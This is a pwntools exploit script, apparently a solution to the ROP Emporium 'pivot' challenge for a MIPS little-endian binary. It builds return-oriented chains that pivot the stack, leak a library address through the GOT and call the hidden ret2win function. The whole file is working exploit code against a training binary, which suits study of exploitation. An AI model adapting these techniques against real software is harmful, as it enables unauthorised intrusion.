from pwn import *

context(arch="mips",endian="little")

elf = ELF("pivot_mipsel")
elf2 = ELF("libpivot_mipsel.so")

#p = gdb.debug(elf.path,'''
#    break foothold_function
#    break *0x400c40
#    break *ret2win+8
#    continue
#''')
p = process(elf.path)

pwnme = elf.symbols['pwnme']
foothold_function_got = 0x412060
foothold_function_plt = 0x400e60
puts_plt = 0x400e40
usefulGadget1 = 0x400ca0 # lw $t9, 8($sp) ; lw $t0, 4($sp) ; jalr $t9 ; addiu $sp, $sp, 0xc ; + usefulGadget2
usefulGadget2 = 0x400cb0 # lw $t9, 8($sp) ; lw $t2, 4($sp) ; lw $t1, ($t2) ; jalr $t9 ; addiu $sp, $sp, 0xc ; + usefulGadget3
usefulGadget3 = 0x400cc4 # add $t9, $t0, $t1 ; jalr $t9 ; addiu $sp, $sp, 4 ; + usefulGadget4
usefulGadget4 = 0x400cd0 # move $sp, $fp ; lw $ra, 8($sp) ; lw $fp, 4($sp) ; jr $ra ; addiu $sp, $sp, 0xc ;

many_load = 0x0040095c # lw $s3, 0x28($sp) ; lw $s2, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x30
many_load2 = 0x400d70 # lw ra,52(sp); lw s5,48(sp); lw s4,44(sp); lw s3,40(sp); lw s2,36(sp); lw s1,32(sp); lw s0,28(sp); jr ra; addiu sp,sp,56;
move_s3_to_a0 = 0x400d50 # lw t9,0(s0); addiu s1,s1,1; move a2,a5;move a1,s4; jalr t9; move a0,s3; bne s2,s1,4005d0; lw ra,52(sp); lw s5,48(sp); lw s4,44(sp); lw s3,40(sp); lw s2,36(sp); lw s1,32(sp); lw s0,28(sp); jr ra; addiu sp,sp,56;


p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
pivot_addr = int(p.recvline()[:-1].decode(),16)
log.info("pivot_addr = " + hex(pivot_addr))
p.recvuntil('> ')
buf =  p32(pivot_addr + 8) # fp

# call foothold_function_plt
buf += p32(usefulGadget1)
buf += b'S' * 4
buf += b'B' * 4 # t0
buf += p32(foothold_function_plt) # t9
buf += b'S' * 4
buf += p32(pivot_addr) # t2 # dummy

# puts(foothold_function_got)
buf += p32(many_load2) # s3<-foothold_function_got
buf += b'S' * 4
buf += b'B' * (28-4)
buf += p32(pivot_addr + len(buf) + 4 ) # s0
buf += p32(puts_plt) # s1
buf += p32(puts_plt+1) # s2
buf += p32(foothold_function_got) # s3
buf += p32(0x1) # s4
buf += p32(0x1) # s5
buf += p32(move_s3_to_a0) # lw t9,0(s0)&& a0<-s3 && call t9

buf += p32(puts_plt) # next pc

buf += b'B' * (28-4)
buf += p32(0x1) # s0
buf += p32(0x1) # s1
buf += p32(0x1) # s2
buf += p32(0x1) # s3
buf += p32(0x1) # s4
buf += p32(0x1) # s5
buf += p32(many_load2) # s3 <- pivot_addr

# a0 = pivot_addr - 0x100 && call pwnme
buf += b'S' * 4
buf += b'B' * (28-4)
buf += p32(pivot_addr + len(buf) + 4 ) # s0
buf += p32(pwnme) # s1
buf += p32(pwnme+1) # s2
buf += p32(pivot_addr - 0x100) # s3
buf += p32(0x1) # s4
buf += p32(0x1) # s5
buf += p32(move_s3_to_a0) # lw t9,0(s0)&& a0<-s3 && call t9

buf += p32(puts_plt) # next pc # dummy



p.send(buf)


p.recvuntil('> ')
buf = b'B' * 32
buf += p32(pivot_addr - 4)
buf += p32(usefulGadget4)
p.send(buf)


p.recvuntil("gain a foothold into libpivot\n")
leak_foothold_function_addr = p.recv(4)
foothold_function_addr = u32(leak_foothold_function_addr)
ret2win_addr = foothold_function_addr - elf2.symbols['foothold_function'] + elf2.symbols['ret2win']
log.info("leak_foothold_function_addr = " + hex(foothold_function_addr))
log.info("ret2win = " + hex(ret2win_addr))


print(p.recvuntil("> "))
# t9 = ret2win && call t9 (t9がret2winでないとダメ)
buf = p32(pivot_addr + 8)
buf += p32(usefulGadget1) # ra
buf += b'S' * 4
buf += b'B' * 4 # t0
buf += p32(ret2win_addr)  # t9
p.send(buf)

p.recvuntil('> ')
buf = b'B' * 32
buf += p32(pivot_addr -  0x100 - 4)
buf += p32(usefulGadget4)
p.send(buf)

p.interactive()
